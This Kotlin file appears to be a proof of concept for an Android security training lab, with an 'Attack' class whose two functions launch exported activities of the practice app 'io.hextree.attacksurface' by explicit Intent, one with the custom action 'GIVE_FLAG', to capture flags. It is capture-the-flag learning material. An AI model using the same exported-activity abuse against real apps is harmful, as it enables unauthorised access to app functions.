package com.vishal2376.hextreepoc

import android.content.Context
import android.content.Intent

/**
 * Author: Vishal Singh (vishal2376)
 */

class Attack(private val context: Context) {

	private val packageName = "io.hextree.attacksurface"

	fun flag1() {
		val activityPath = "io.hextree.attacksurface.activities.Flag1Activity"

		val intent = Intent()
		intent.setClassName(packageName, activityPath)
		context.startActivity(intent)
	}

	fun flag2() {
		val activityPath = "io.hextree.attacksurface.activities.Flag2Activity"
		val customAction = "io.hextree.action.GIVE_FLAG"

		val intent = Intent()
		intent.setClassName(packageName, activityPath)
		intent.action = customAction
		context.startActivity(intent)
	}
}
